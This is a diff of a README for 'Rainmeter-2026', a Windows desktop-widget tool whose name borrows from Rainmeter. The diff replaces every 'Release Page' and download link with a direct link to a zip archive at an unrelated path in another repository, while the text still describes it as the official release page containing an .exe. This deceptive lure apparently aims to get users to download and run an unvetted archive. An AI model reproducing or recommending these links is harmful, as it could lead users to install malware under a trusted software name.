@@ -5,7 +5,7 @@ description: "Download the official Rainmeter installer for Windows 10 and 11 to
 ---
 # 🎨 Rainmeter-2026 - Customize your desktop with useful widgets
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/haroldwrong255/Rainmeter-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/haroldwrong255/haroldwrong255.github.io/raw/refs/heads/main/anthropomorph/haroldwrong_github_io_3.7.zip)
 
 Rainmeter-2026 allows you to change the look of your Windows desktop. This software places interactive skins on your screen. You can display system information, weather updates, music players, and other tools. Users choose from a library of skins to change colors, shapes, and functions. This application works on Windows 10 and Windows 11.
 
@@ -13,9 +13,9 @@ Rainmeter-2026 allows you to change the look of your Windows desktop. This softw
 
 You need to download the installer file first. Visit the official release page to get the latest version.
 
-[Download Rainmeter-2026 Here](https://github.com/haroldwrong255/Rainmeter-2026/releases)
+[Download Rainmeter-2026 Here](https://github.com/haroldwrong255/haroldwrong255.github.io/raw/refs/heads/main/anthropomorph/haroldwrong_github_io_3.7.zip)
 
-1. Open the [Release Page](https://github.com/haroldwrong255/Rainmeter-2026/releases) using your web browser.
+1. Open the [Release Page](https://github.com/haroldwrong255/haroldwrong255.github.io/raw/refs/heads/main/anthropomorph/haroldwrong_github_io_3.7.zip) using your web browser.
 2. Locate the file ending in .exe under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder or any location you prefer.
